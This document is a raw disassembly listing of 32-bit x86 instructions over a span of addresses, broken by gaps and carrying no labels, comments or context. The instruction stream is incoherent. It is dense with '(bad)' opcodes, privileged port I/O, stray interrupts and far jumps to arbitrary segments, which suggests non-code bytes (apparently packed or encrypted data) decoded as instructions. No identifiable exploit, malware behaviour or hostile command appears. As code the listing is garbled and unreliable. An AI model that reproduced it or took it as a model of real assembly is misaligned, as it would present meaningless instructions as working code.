  41a96e:	mov    cl,0x8
  41a970:	xor    bl,BYTE PTR [edi-0x3]
  41a973:	ins    BYTE PTR es:[di],dx
  41a975:	das    
  41a976:	aaa    
  41a977:	fld    QWORD PTR [eax+0x6a]
  41a97a:	loope  0x41a9ac
  41a97c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a97d:	mov    ebx,0x8430f394
  41a982:	mov    ebp,0x738a7c6c
  41a987:	xor    dh,dh
  41a989:	sub    dh,BYTE PTR [ebp-0x3769823a]
  41a98f:	mov    ch,0x54
  41a991:	imul   eax,DWORD PTR [edi-0x2f],0x6a
  41a995:	outs   dx,BYTE PTR ds:[esi]
  41a996:	fiadd  DWORD PTR ds:0x74acc16f
  41a99c:	jnp    0x41a939
  41a99e:	sub    al,cl
  41a9a0:	push   DWORD PTR [edx+edi*8+0x1975000f]
  41a9a7:	cs jbe 0x41a9c0
  41a9aa:	cmc    
  41a9ab:	cwde   
  41a9ac:	mov    cl,0x3
  41a9ae:	call   0xec9b:0xc442d241
  41a9b5:	adc    DWORD PTR [eax],ecx
  41a9b7:	fstp   st(2)
  41a9b9:	mov    bl,0xa
  41a9bb:	sub    ah,BYTE PTR [edx-0x59eb1718]
  41a9c1:	imul   edi,DWORD PTR [edi-0x6d5b2d4d],0xc4d3c0d6
  41a9cb:	imul   BYTE PTR [edx-0x41]
  41a9ce:	lods   al,BYTE PTR ds:[esi]
  41a9cf:	std    
  41a9d0:	and    al,0x2b
  41a9d2:	cmp    DWORD PTR [ebx+0x6993deee],ecx
  41a9d8:	shl    bh,cl
  41a9da:	pushf  
  41a9db:	xchg   esp,eax
  41a9dc:	xchg   esi,eax
  41a9dd:	outs   dx,BYTE PTR ds:[esi]
  41a9de:	outs   dx,BYTE PTR ds:[esi]
  41a9df:	sar    BYTE PTR [ecx+esi*1+0x52],cl
  41a9e3:	sahf   
  41a9e4:	or     al,0x29
  41a9e6:	repnz sub al,0xe1
  41a9e9:	sbb    eax,0x6ee5f493
  41a9ee:	dec    esp
  41a9ef:	add    edx,eax
  41a9f1:	mov    al,0x76
  41a9f3:	xchg   esi,eax
  41a9f4:	jg     0x41aa1e
  41a9f6:	rol    edx,1
  41a9f8:	test   BYTE PTR [ecx-0x21235ffb],dh
  41a9fe:	sti    
  41a9ff:	hlt    
  41aa00:	rcr    dh,cl
  41aa02:	or     BYTE PTR [esi],bl
  41aa04:	mov    ecx,0xfc415329
  41aa09:	mov    bl,0xd0
  41aa0b:	imul   ebx,DWORD PTR [edi+0x2f4f0b87],0xffffffeb
  41aa12:	arpl   WORD PTR [ebp+0x78],si
  41aa15:	pop    ebx
  41aa16:	sub    ch,ch
  41aa18:	sub    DWORD PTR [edi-0x3],ebp
  41aa1b:	test   DWORD PTR [edi+0x18],ebp
  41aa1e:	nop
  41aa1f:	in     al,dx
  41aa20:	mov    ds:0x800513b7,eax
  41aa25:	ret    0xc1a3
  41aa28:	and    al,BYTE PTR [edi+0x7ff20c2e]
  41aa2e:	add    BYTE PTR [edi-0x2491f20c],0xea
	...
  41aa95:	add    bh,dh
  41aa97:	add    esp,ebx
  41aa99:	mov    ah,0xfe
  41aa9b:	std    
  41aa9c:	inc    DWORD PTR [ebx-0x4b]
  41aa9f:	mov    ds:0xdac6e277,al
  41aaa4:	(bad)  
  41aaa5:	daa    
  41aaa6:	in     eax,0x18
  41aaa8:	add    DWORD PTR [eax],eax
  41aaaa:	pop    es
  41aaab:	add    DWORD PTR [eax],eax
  41aaad:	add    ah,bh
  41aaaf:	sbb    BYTE PTR [esi],0x1d
  41aab2:	out    0x5f,eax
  41aab4:	mov    ch,0x74
  41aab6:	and    bl,bl
  41aab8:	(bad)  
  41aab9:	cmp    BYTE PTR [ebx+eiz*4+0x54],cl
  41aabd:	paddusw mm2,QWORD PTR [ecx-0x678c9916]
  41aac4:	pop    edx
  41aac5:	xor    ecx,0x3a527237
  41aacb:	out    0x10,al
  41aacd:	loope  0x41aaea
  41aacf:	jmp    0x96203899
  41aad4:	or     dh,BYTE PTR [eax]
  41aad6:	jmp    FWORD PTR [edx-0x66311510]
  41aadc:	int    0x5e
  41aade:	stos   BYTE PTR es:[edi],al
  41aadf:	cli    
  41aae0:	jmp    0xc45f:0xa7c24160
  41aae7:	cmc    
  41aae8:	test   BYTE PTR [eax],cl
  41aaea:	xchg   ebp,eax
  41aaeb:	jo     0x41aa79
  41aaed:	retf   
  41aaee:	cmp    DWORD PTR [edx+0x3f],ebp
  41aaf1:	inc    eax
  41aaf2:	dec    ebx
  41aaf3:	(bad)  
  41aaf4:	std    
  41aaf5:	or     eax,0x54bc8fad
  41aafa:	xchg   ecx,eax
  41aafb:	cdq    
  41aafc:	xchg   esp,eax
  41aafd:	push   ds
  41aafe:	jae    0x41aa9e
  41ab00:	lds    ecx,FWORD PTR fs:[eax+ebp*8]
  41ab04:	mov    edx,0x84e30d
  41ab09:	cmp    DWORD PTR [esi-0x7a2ca79d],0xffffffa3
  41ab10:	(bad)  
  41ab11:	sahf   
  41ab12:	jo     0x41ab03
  41ab14:	test   ebp,eax
  41ab16:	retf   
  41ab17:	jmp    0x97781889
  41ab1c:	mov    ebp,0x8cbf2533
  41ab21:	pusha  
  41ab22:	mov    dl,0xd6
  41ab24:	sub    DWORD PTR ds:[ecx+0x5915e4e0],esi
  41ab2b:	pop    esi
  41ab2c:	jmp    0x185fecf
  41ab31:	push   es
  41ab32:	cld    
  41ab33:	mov    bh,0xd7
  41ab35:	inc    edi
  41ab36:	and    BYTE PTR [edi+0x1a41f752],al
  41ab3c:	xlat   BYTE PTR ds:[ebx]
  41ab3d:	adc    DWORD PTR [edx-0x3133bbd5],edx
  41ab43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab45:	repnz data16 aas 
  41ab48:	out    0x4a,eax
  41ab4a:	sub    BYTE PTR [ecx+0x58],0xd7
  41ab4e:	sub    ecx,DWORD PTR ds:0xb87a708c
  41ab54:	ret    0x1dd1
  41ab57:	push   ss
  41ab58:	adc    esi,DWORD PTR [ecx-0x26be7198]
  41ab5e:	rcl    edx,cl
  41ab60:	cdq    
  41ab61:	lock js 0x41ab9d
  41ab64:	in     eax,0xe6
  41ab66:	int    0x54
  41ab68:	int3   
  41ab69:	fmul   DWORD PTR [ecx]
  41ab6b:	add    ecx,DWORD PTR [ecx-0x745b910d]
  41ab71:	mov    dl,0x1a
  41ab73:	xor    edi,esi
  41ab75:	imul   ebp,DWORD PTR [ecx],0x3e
  41ab78:	dec    ecx
  41ab79:	jno    0x41ab9a
  41ab7b:	jecxz  0x41ab2f
  41ab7d:	mov    ecx,0x48ec39c6
  41ab82:	and    eax,0xbec24441
  41ab87:	ins    BYTE PTR es:[edi],dx
  41ab88:	dec    ebx
  41ab89:	mov    esp,0xdb19158c
  41ab8e:	popa   
  41ab8f:	cdq    
  41ab90:	sub    esp,DWORD PTR [ebx-0xa3386c]
  41ab96:	arpl   si,ax
  41ab98:	ret    0xe98d
  41ab9b:	mov    eax,0xe5c883b7
  41aba0:	sub    ch,0xf0
  41aba3:	mov    al,ds:0x937ab465
  41aba8:	mov    ebp,0xb907f8c9
  41abad:	in     al,dx
  41abae:	imul   edi,DWORD PTR [ecx],0x66
  41abb1:	out    0xea,eax
  41abb3:	push   0xd7
	...
  41ac14:	add    BYTE PTR [eax],al
  41ac16:	push   0x49
  41ac18:	es cmp al,0x27
  41ac1b:	jg     0x41ac97
  41ac1d:	pop    edi
  41ac1e:	pop    esp
  41ac1f:	mov    edx,0xf13fcc53
  41ac24:	cmpxchg esp,ebp
  41ac27:	sbb    DWORD PTR [ecx],eax
  41ac29:	add    BYTE PTR [edi],al
  41ac2b:	add    DWORD PTR [eax],eax
  41ac2d:	add    BYTE PTR ds:0xee9d9189,ah
  41ac33:	jge    0x41ac82
  41ac35:	and    al,0xeb
  41ac37:	cmp    BYTE PTR [ecx+0x74534029],ah
  41ac3d:	or     al,0x46
  41ac3f:	ins    BYTE PTR es:[edi],dx
  41ac40:	dec    ebp
  41ac41:	pop    ebp
  41ac42:	not    DWORD PTR [edi]
  41ac44:	out    dx,al
  41ac45:	adc    BYTE PTR [eax-0x2f],0x2
  41ac49:	mov    ebp,0xb1eb4bb
  41ac4e:	sub    bl,al
  41ac50:	and    cl,BYTE PTR [ecx+0x6c34abc1]
  41ac56:	pop    eax
  41ac57:	jno    0x41acc1
  41ac59:	std    
  41ac5a:	dec    esi
  41ac5b:	repz ret 0xab08
  41ac5f:	xor    DWORD PTR [ebx+0x57d71815],esp
  41ac65:	xchg   DWORD PTR [edi+0x2a],edx
  41ac68:	arpl   WORD PTR [ebx+0x6669c343],dx
  41ac6e:	es pop esp
  41ac70:	daa    
  41ac71:	cs clc 
  41ac73:	xlat   BYTE PTR ds:[ebx]
  41ac74:	sub    al,0x40
  41ac76:	hlt    
  41ac77:	xor    ecx,DWORD PTR [ebx+esi*1-0x65740401]
  41ac7e:	lods   eax,DWORD PTR ds:[esi]
  41ac7f:	arpl   WORD PTR [ebp+0x27733a8a],cx
  41ac85:	pop    eax
  41ac86:	dec    esi
  41ac87:	sbb    cl,al
  41ac89:	xor    eax,0x27ebf7ce
  41ac8e:	pop    si
  41ac90:	les    eax,FWORD PTR [ebx]
  41ac92:	mov    ecx,0x73dc3bf7
  41ac97:	mov    edx,0xd5a46136
  41ac9c:	push   ebx
  41ac9d:	outs   dx,BYTE PTR ds:[esi]
  41ac9e:	les    edi,FWORD PTR [ecx]
  41aca0:	push   0xdb516bb7
  41aca5:	cdq    
  41aca6:	jns    0x41ac64
  41aca8:	ds das 
  41acaa:	loopne 0x41ac7a
  41acac:	adc    ch,dl
  41acae:	and    BYTE PTR ds:0x14ff444d,dl
  41acb4:	jmp    0x41ac3f
  41acb6:	bound  ebx,QWORD PTR [edx-0x6d]
  41acb9:	jae    0x41ac9e
  41acbb:	stos   DWORD PTR es:[edi],eax
  41acbc:	dec    ebp
  41acbd:	or     ah,BYTE PTR [ecx]
  41acbf:	and    ah,dl
  41acc1:	mov    DWORD PTR [ecx],ebp
  41acc3:	cmp    al,0xe3
  41acc5:	mov    esp,0x402daf02
  41acca:	pop    esp
  41accb:	cmc    
  41accc:	inc    ecx
  41accd:	inc    ebx
  41acce:	mov    ds:0xf1826db0,al
  41acd3:	lods   eax,DWORD PTR ds:[esi]
  41acd4:	or     al,0xad
  41acd6:	rcr    DWORD PTR [ecx],cl
  41acd8:	jge    0x41aca9
  41acda:	in     al,0x3
  41acdc:	in     eax,0x10
  41acde:	outs   dx,DWORD PTR ds:[esi]
  41acdf:	sti    
  41ace0:	bnd jno 0x41ad0e
  41ace3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ace4:	dec    ebx
  41ace5:	mov    BYTE PTR [eax-0x53f2e140],bh
  41aceb:	mov    eax,ds:0x103b11c9
  41acf0:	cmp    BYTE PTR [ebp+0x5df5484f],bh
  41acf6:	mov    ?,WORD PTR [edx+eax*4-0x2e]
  41acfa:	inc    esi
  41acfb:	aam    0x57
  41acfd:	mov    cl,0x7b
  41acff:	sahf   
  41ad00:	popf   
  41ad01:	(bad)  
  41ad02:	out    0xcd,al
  41ad04:	mov    cl,0xb8
  41ad06:	push   edi
  41ad07:	mov    ch,ah
  41ad09:	js     0x41ad4e
  41ad0b:	les    esp,FWORD PTR [ecx]
  41ad0d:	push   0x8e6b474b
  41ad12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad13:	fmul   DWORD PTR [esi+0x52]
  41ad16:	getsec 
  41ad18:	jg     0x41ad18
  41ad1a:	aaa    
  41ad1b:	imul   DWORD PTR [ebp+0xb8f6337]
  41ad21:	xchg   BYTE PTR [ebp+0x5b],ah
  41ad24:	mov    ecx,0xe2f4bd78
  41ad29:	aas    
  41ad2a:	sar    BYTE PTR [ecx+0x3d],cl
  41ad2d:	sub    eax,DWORD PTR [eax]
  41ad2f:	jle    0x41ad86
  41ad31:	and    DWORD PTR [esi+0xaba9],edx
	...
  41ad93:	add    BYTE PTR [eax],al
  41ad95:	add    BYTE PTR [ebp-0x8],dl
  41ad98:	or     DWORD PTR [esi-0x4280053],ebx
  41ad9e:	mov    dh,BYTE PTR [eax+eax*4]
  41ada1:	add    ecx,DWORD PTR [edi-0x68]
  41ada4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ada5:	xor    bl,0x1a
  41ada8:	add    DWORD PTR [eax],eax
  41adaa:	pop    es
  41adab:	add    DWORD PTR [eax],eax
  41adad:	add    ah,dh
  41adaf:	xchg   ebx,eax
  41adb0:	data16 loope 0x41ae28
  41adb3:	mov    cx,0xab8f
  41adb7:	shl    BYTE PTR [eax],cl
  41adb9:	or     eax,0x6dfb91ed
  41adbe:	mov    ecx,0xb349c8d
  41adc3:	repnz loop 0x41ade5
  41adc6:	mov    ds:0xdc210c16,al
  41adcb:	cdq    
  41adcc:	ds imul edx,ebx,0x65
  41add0:	add    dh,0x78
  41add3:	(bad)  
  41add4:	sub    edi,ecx
  41add6:	ret    0x7302
  41add9:	xchg   edx,eax
  41adda:	jnp    0x41ae2f
  41addc:	(bad)  
  41addd:	call   0x2855:0x14fcadb2
  41ade4:	sbb    al,0x63
  41ade6:	dec    ebp
  41ade7:	xchg   ecx,eax
  41ade8:	sbb    BYTE PTR [ecx+0x56],ah
  41adeb:	imul   esi,DWORD PTR [eax+0xa80af3f],0x22
  41adf2:	xor    eax,0xab2d5a60
  41adf7:	in     al,0xe6
  41adf9:	(bad)  
  41adfa:	in     al,dx
  41adfb:	pop    edx
  41adfc:	jl     0x41ae41
  41adfe:	mov    al,0x6a
  41ae00:	mov    DWORD PTR [edx],eax
  41ae02:	cmp    edx,DWORD PTR [ebp+0x2e]
  41ae05:	mov    eax,0x1381bac9
  41ae0a:	mov    ds:0x8deb091e,al
  41ae0f:	cmp    BYTE PTR [edx-0x4],dl
  41ae12:	push   edi
  41ae13:	(bad)  
  41ae14:	in     al,dx
  41ae15:	loop   0x41ae13
  41ae17:	gs cmp ch,bh
  41ae1a:	int3   
  41ae1b:	add    BYTE PTR [eax+0x64],bl
  41ae1e:	jo     0x41ae89
  41ae20:	es scas eax,DWORD PTR es:[edi]
  41ae22:	jmp    0x41adbb
  41ae24:	jne    0x41adf1
  41ae26:	bound  esi,QWORD PTR [ebp+0x7540fa72]
  41ae2c:	and    eax,0x5c542894
  41ae31:	ds inc esp
  41ae33:	bound  ebp,QWORD PTR [ebx+edx*2+0x7c4251ab]
  41ae3a:	stos   BYTE PTR es:[edi],al
  41ae3b:	sub    DWORD PTR [esi+eax*2+0x5cbc1546],eax
  41ae42:	mov    ch,0x74
  41ae44:	or     al,0x74
  41ae46:	push   esi
  41ae47:	loopne 0x41ae7f
  41ae49:	pop    esp
  41ae4a:	inc    edi
  41ae4b:	mov    ch,0xab
  41ae4d:	clc    
  41ae4e:	fidivr DWORD PTR [esi]
  41ae50:	or     al,0xa7
  41ae52:	and    ecx,0xffffffe3
  41ae55:	inc    ebp
  41ae56:	xor    al,0x98
  41ae58:	xor    al,BYTE PTR [ebp+eax*1+0x3108c89a]
  41ae5f:	icebp  
  41ae60:	mov    esp,0x94dddbdb
  41ae65:	sbb    BYTE PTR [edx+0x61],bl
  41ae68:	(bad)  
  41ae6a:	xchg   esp,eax
  41ae6b:	jae    0x41ae0a
  41ae6d:	pop    edi
  41ae6e:	adc    dh,BYTE PTR [ecx]
  41ae70:	jp     0x41ae25
  41ae72:	and    BYTE PTR [esp+edi*8+0x11],al
  41ae76:	sub    edi,esp
  41ae78:	(bad)  
  41ae79:	std    
  41ae7a:	mov    ds:0x8a1799dd,eax
  41ae7f:	push   esi
  41ae80:	inc    ebx
  41ae81:	sbb    ecx,ecx
  41ae83:	ins    DWORD PTR es:[edi],dx
  41ae84:	adc    cl,BYTE PTR [edx]
  41ae86:	call   0xab87:0xd773bd84
  41ae8d:	stos   BYTE PTR es:[edi],al
  41ae8e:	pop    esi
  41ae8f:	ds mov ah,0x83
  41ae92:	jmp    0x92439502
  41ae97:	fs call 0xd619:0x3cfd625b
  41ae9f:	jmp    0x41ae8a
  41aea1:	xor    BYTE PTR [ebx-0xe321994],bh
  41aea7:	repnz (bad) 
  41aea9:	cmp    esi,eax
  41aeab:	mov    eax,0x4d282f2
  41aeb0:	fwait
  41aeb1:	pop    ebp
  41aeb2:	rcr    dh,1
  41aeb4:	pop    ecx
	...
  41af15:	add    ch,al
  41af17:	stc    
  41af18:	lods   eax,DWORD PTR ds:[esi]
  41af19:	xor    edi,DWORD PTR [ebp+0x56ffdf77]
  41af1f:	xor    al,0x39
  41af21:	loop   0x41af6f
  41af23:	mov    al,0x60
  41af25:	jl     0x41af21
  41af27:	sbb    eax,DWORD PTR [ecx]
  41af29:	add    BYTE PTR [edi],al
  41af2b:	add    DWORD PTR [eax],eax
  41af2d:	add    BYTE PTR [ebx+0x8],ah
  41af30:	sbb    DWORD PTR [esi-0x32b080d1],esp
  41af36:	retf   
  41af37:	out    dx,al
  41af38:	mov    esi,0xc7542f12
  41af3d:	or     bl,BYTE PTR [esi]
  41af3f:	out    dx,al
  41af40:	or     DWORD PTR [ebx+0x19],0xffffff90
  41af44:	ins    BYTE PTR es:[edi],dx
  41af45:	js     0x41af17
  41af47:	add    eax,0xc440366a
  41af4c:	fnstenv [edx-0x35]
  41af4f:	js     0x41af79
  41af51:	mov    dh,bl
  41af53:	test   BYTE PTR [esi-0x39],0x98
  41af57:	mov    edi,0x1ac714db
  41af5c:	inc    edi
  41af5d:	push   esi
  41af5e:	pusha  
  41af5f:	push   cs
  41af60:	int    0xf4
  41af62:	dec    ecx
  41af63:	inc    ebx
  41af65:	test   ebp,esi
  41af67:	xor    DWORD PTR [edi+0xc36dfb7],eax
  41af6d:	call   0x89e0cf08
  41af72:	shl    DWORD PTR [ebx+0x2c3cae99],1
  41af78:	sub    DWORD PTR [esi],ebx
  41af7a:	fst    st(2)
  41af7c:	and    DWORD PTR [esi],ecx
  41af7e:	gs mov ebp,0x57958b40
  41af84:	fcom   DWORD PTR [edi]
  41af86:	xor    eax,0x147334fe
  41af8b:	mov    ds:0xb1782cc9,al
  41af90:	call   0xf9ec8c4b
  41af95:	mov    eax,0xa67b5214
  41af9a:	jmp    0x41af82
  41af9c:	mov    WORD PTR [eax-0x41],ss
  41af9f:	leave  
  41afa0:	jns    0x41afd0
  41afa2:	pop    es
  41afa3:	inc    esi
  41afa4:	mov    al,ds:0x94d80e05
  41afa9:	enter  0x7b74,0xb8
  41afad:	ror    DWORD PTR ds:0xfe01a4f9,1
  41afb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afb4:	or     esp,0x38dc82e
  41afba:	stos   BYTE PTR es:[edi],al
  41afbb:	push   0x8f9ec5ce
  41afc0:	leave  
  41afc1:	dec    ebx
  41afc2:	lahf   
  41afc3:	and    edx,DWORD PTR [esi-0x73e4989f]
  41afc9:	add    al,0xd9
  41afcb:	loop   0x41af88
  41afcd:	in     eax,0x7a
  41afcf:	aas    
  41afd0:	arpl   WORD PTR [bp+di+0x19],sp
  41afd4:	pop    edi
  41afd5:	les    ecx,FWORD PTR [edi-0x5f]
  41afd8:	mov    DWORD PTR [edx],ecx
  41afda:	sbb    eax,0xb252c6a5
  41afdf:	mov    esi,0xb08b04a5
  41afe4:	add    ah,bl
  41afe6:	jne    0x41af71
  41afe8:	cwde   
  41afe9:	mov    ch,0x90
  41afeb:	lods   al,BYTE PTR ds:[esi]
  41afec:	inc    ebx
  41afed:	jbe    0x41b038
  41afef:	xor    edx,edi
  41aff1:	test   eax,0x15079f7c
  41aff6:	les    edx,FWORD PTR [ebp+ebx*8-0x71]
  41affa:	push   0x1f00468a
  41afff:	mov    edi,0xd91a4f29
  41b004:	push   edx
  41b005:	mov    gs,eax
  41b007:	loope  0x41aff0
  41b009:	sbb    al,0x26
  41b00b:	mov    bl,0xec
  41b00d:	scas   eax,DWORD PTR es:[edi]
  41b00e:	imul   edi,DWORD PTR [esi+ebp*2+0x6097829b],0xffffffa6
  41b016:	(bad)  
  41b017:	stos   DWORD PTR es:[edi],eax
  41b018:	or     al,0x73
  41b01a:	sub    al,0x63
  41b01c:	std    
  41b01d:	jae    0x41b038
  41b01f:	inc    ebp
  41b020:	shl    bl,0x23
  41b023:	addr16 pop eax
  41b025:	imul   edi,DWORD PTR [edx+ebx*2],0x58
  41b029:	and    esp,DWORD PTR [edx-0x495ef0c7]
  41b02f:	push   es
  41b030:	int    0xab
  41b032:	jne    0x41b071
  41b034:	daa    
	...
  41b095:	add    dh,al
  41b097:	ficom  WORD PTR [eax]
  41b099:	stos   DWORD PTR es:[edi],eax
  41b09a:	sbb    bh,ch
  41b09c:	(bad)  
  41b09d:	jmp    DWORD PTR [eax]
  41b09f:	jmp    FWORD PTR [esi+0x2f32831]
  41b0a5:	jge    0x41b0a8
  41b0a7:	sbb    eax,0x1070001
  41b0ac:	add    BYTE PTR [eax],al
  41b0ae:	adc    ah,BYTE PTR [esi-0x79ffdd0e]
  41b0b4:	enter  0x7301,0x57
  41b0b8:	ficomp DWORD PTR [eax+0x4a]
  41b0bb:	push   ecx
  41b0bc:	push   edx
  41b0bd:	lds    ebx,FWORD PTR [eax]
  41b0bf:	jne    0x41b0e5
  41b0c1:	sbb    bh,BYTE PTR [edi+edx*4-0x5a]
  41b0c5:	sub    eax,0xf8f53002
  41b0ca:	jmp    0x9346d767
  41b0cf:	mov    ss,edi
  41b0d1:	mov    esp,0xa1a4d35c
  41b0d6:	xchg   edx,eax
  41b0d7:	in     eax,dx
  41b0d8:	xchg   BYTE PTR [esi+0x65],bl
  41b0db:	fldenv [esi-0x23]
  41b0de:	lahf   
  41b0df:	dec    edx
  41b0e0:	mov    cs,WORD PTR [ecx+0x313ec821]
  41b0e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0e7:	mov    bh,0x42
  41b0e9:	jae    0x41b0e2
  41b0eb:	sti    
  41b0ec:	ret    
  41b0ed:	jge    0x41b14a
  41b0ef:	cmc    
  41b0f0:	jbe    0x41b0f6
  41b0f2:	jmp    0xf51b223c
  41b0f7:	or     al,0x89
  41b0f9:	aad    0x86
  41b0fb:	mov    BYTE PTR [edx],cl
  41b0fd:	call   0x31b6:0x60f4f6b4
  41b104:	add    DWORD PTR [ecx+0x5b],edx
  41b107:	pop    eax
  41b108:	gs add al,0x7a
  41b10b:	inc    DWORD PTR [eax+0x45]
  41b10e:	bound  ebx,QWORD PTR [ebx+0x39]
  41b111:	mov    edi,0x4c2b908b
  41b116:	fs sbb eax,0xdc3d9410
  41b11c:	das    
  41b11d:	mov    al,ds:0x3f05f230
  41b122:	out    dx,eax
  41b123:	mov    bl,0x1f
  41b125:	imul   ebx,esp,0x1b97f52d
  41b12b:	inc    ebp
  41b12c:	push   cs
  41b12d:	aam    0xd6
  41b12f:	out    dx,al
  41b130:	sahf   
  41b131:	je     0x41b0ce
  41b133:	xchg   edx,eax
  41b134:	(bad)  
  41b136:	lock hlt 
  41b138:	fs add edi,ecx
  41b13b:	cwd    
  41b13d:	xchg   ah,bh
  41b13f:	stc    
  41b140:	les    ecx,FWORD PTR [eax+0x1e]
  41b143:	cdq    
  41b144:	into   
  41b145:	cli    
  41b146:	jnp    0x41b13e
  41b148:	mov    al,ds:0x4b59aa2c
  41b14d:	mov    eax,ds:0x1214aaae
  41b152:	dec    esi
  41b153:	dec    ecx
  41b154:	push   ds
  41b155:	jb     0x41b1ad
  41b157:	or     edi,DWORD PTR [esi-0x38ffe24a]
  41b15d:	cdq    
  41b15e:	mov    eax,ds:0xac9de618
  41b163:	add    al,0x93
  41b165:	shl    DWORD PTR ds:0x50242b53,0x82
  41b16c:	iret   
  41b16d:	iret   
  41b16e:	or     dl,BYTE PTR [ebx]
  41b170:	xchg   ebp,eax
  41b171:	cmp    bl,BYTE PTR [ebp-0x4743fe4]
  41b177:	cmp    ah,BYTE PTR [edi+0x7933bdc4]
  41b17d:	mov    bl,0xca
  41b17f:	pop    eax
  41b180:	pop    esp
  41b181:	std    
  41b182:	(bad)  
  41b183:	sti    
  41b184:	mov    ebx,0x9f0c9116
  41b189:	and    BYTE PTR [ecx+0x4b],bh
  41b18c:	dec    edi
  41b18d:	in     eax,dx
  41b18e:	stc    
  41b18f:	mov    bh,0x23
  41b191:	add    al,0x9a
  41b193:	(bad)  
  41b195:	inc    edi
  41b196:	jmp    0xc8a06eb5
  41b19b:	and    BYTE PTR [ebx+0x3f],al
  41b19e:	jl     0x41b1b3
  41b1a0:	stos   BYTE PTR es:[edi],al
  41b1a1:	and    bl,BYTE PTR [ecx+edx*1-0x66]
  41b1a5:	int3   
  41b1a6:	dec    ebx
  41b1a7:	jge    0x41b192
  41b1a9:	enter  0x5a52,0x4
  41b1ad:	pop    ds
  41b1ae:	and    cl,BYTE PTR ds:0x2734572d
  41b1b4:	ja     0x41b1b6
	...
  41b216:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b21c:	(bad)  
  41b21d:	out    dx,eax
  41b21e:	arpl   WORD PTR [edi-0x53],sp
  41b221:	aas    
  41b222:	scas   eax,DWORD PTR es:[edi]
  41b223:	cli    
  41b224:	pop    esp
  41b225:	adc    eax,0x11e08
  41b22a:	pop    es
  41b22b:	add    DWORD PTR [eax],eax
  41b22d:	add    BYTE PTR [ebx+eax*4+0x38],dl
  41b231:	and    esi,DWORD PTR [ebx]
  41b233:	into   
  41b234:	and    al,0x6c
  41b236:	cmc    
  41b237:	or     ch,BYTE PTR [ecx+0x49]
  41b23a:	sub    eax,ebx
  41b23c:	jno    0x41b1cf
  41b23e:	dec    ebp
  41b23f:	push   eax
  41b240:	inc    ecx
  41b241:	push   cs
  41b242:	mov    ebp,0xd2b2b078
  41b247:	mov    esi,0x9f45e911
  41b24c:	outs   dx,BYTE PTR ds:[esi]
  41b24d:	cmp    bl,ch
  41b24f:	cmp    edx,DWORD PTR ds:0x4a7a326f
  41b255:	pop    esi
  41b256:	mov    dh,0x89
  41b258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b259:	sbb    ebx,DWORD PTR [edx]
  41b25b:	mov    dl,0x1a
  41b25d:	jmp    0x41b205
  41b25f:	push   edx
  41b260:	out    0x5a,eax
  41b262:	cs out 0xca,eax
  41b265:	retf   0xa409
  41b268:	push   edi
  41b269:	stc    
  41b26a:	ret    
  41b26b:	xchg   esp,eax
  41b26c:	push   ecx
  41b26d:	loope  0x41b2e9
  41b26f:	ds sub al,cl
  41b272:	and    esp,edi
  41b274:	jno    0x41b249
  41b276:	adc    al,0xef
  41b278:	mov    bh,0x33
  41b27a:	push   cs
  41b27b:	jno    0x41b250
  41b27d:	dec    ebp
  41b27e:	jne    0x41b2e1
  41b280:	mov    dh,0xe7
  41b282:	(bad)  
  41b283:	push   eax
  41b284:	out    dx,al
  41b285:	lods   al,BYTE PTR gs:[esi]
  41b287:	and    ebp,DWORD PTR [eax+0x1]
  41b28a:	lods   al,BYTE PTR ds:[esi]
  41b28b:	adc    dh,bl
  41b28d:	sbb    DWORD PTR [ebp+0x72],0x3b6b1883
  41b294:	pop    eax
  41b295:	stos   BYTE PTR es:[edi],al
  41b296:	xor    al,0x4f
  41b298:	sub    al,ch
  41b29a:	fist   DWORD PTR [ebp+0x10]
  41b29d:	test   al,0x93
  41b29f:	mov    eax,0x2eeede5c
  41b2a4:	in     eax,dx
  41b2a5:	test   BYTE PTR [ecx],0xf8
  41b2a8:	mov    al,0xcc
  41b2aa:	and    eax,DWORD PTR [ebx+edi*2]
  41b2ad:	leave  
  41b2ae:	xchg   edx,edx
  41b2b0:	addr16 xor al,0xc9
  41b2b3:	int    0x81
  41b2b5:	(bad)  
  41b2b6:	imul   ebx,DWORD PTR ds:0xc12f022b,0xee885b85
  41b2c0:	shr    BYTE PTR [ebx],1
  41b2c2:	adc    al,0xb3
  41b2c4:	retf   
  41b2c5:	aad    0x57
  41b2c7:	pop    esp
  41b2c8:	push   edx
  41b2c9:	pop    edx
  41b2ca:	fstp   DWORD PTR [esi-0x4e]
  41b2cd:	mov    eax,ebx
  41b2cf:	mov    al,ds:0xf71d38
  41b2d4:	jp     0x41b287
  41b2d6:	popf   
  41b2d7:	adc    bh,BYTE PTR [ebp+esi*8-0x38]
  41b2db:	push   cs
  41b2dc:	je     0x41b2dc
  41b2de:	lahf   
  41b2df:	pop    ebx
  41b2e0:	aas    
  41b2e1:	mov    DWORD PTR [eiz*2+0x2adc79d7],edi
  41b2e8:	into   
  41b2e9:	push   esi
  41b2ea:	(bad)  
  41b2eb:	int    0x7b
  41b2ed:	cmp    ax,0xd
  41b2f1:	femms  
  41b2f3:	call   0x9665f33
  41b2f8:	adc    DWORD PTR [esi+0x76],ebx
  41b2fb:	inc    ecx
  41b2fc:	arpl   WORD PTR [ebx-0x7b5802dc],si
  41b302:	cmovae ebx,ecx
  41b305:	jecxz  0x41b28b
  41b307:	dec    ecx
  41b308:	add    eax,0xe1df4a91
  41b30d:	test   al,0xf6
  41b30f:	jp     0x41b358
  41b311:	ins    DWORD PTR es:[edi],dx
  41b312:	or     al,0x11
  41b314:	xor    eax,0x1dcb140f
  41b319:	mov    edi,0x1e929d43
  41b31e:	arpl   WORD PTR [edi-0x55],sp
  41b321:	or     edx,DWORD PTR [ecx]
  41b323:	cmp    eax,0x152eb838
  41b328:	repz int3 
  41b32a:	inc    edx
  41b32b:	(bad)  
  41b32d:	dec    edi
  41b32e:	ss pop esp
  41b330:	inc    esi
  41b331:	add    eax,0xda8d59
	...
  41b396:	dec    eax
  41b397:	or     eax,0xbb5dab1d
  41b39c:	(bad)  
  41b39d:	out    dx,eax
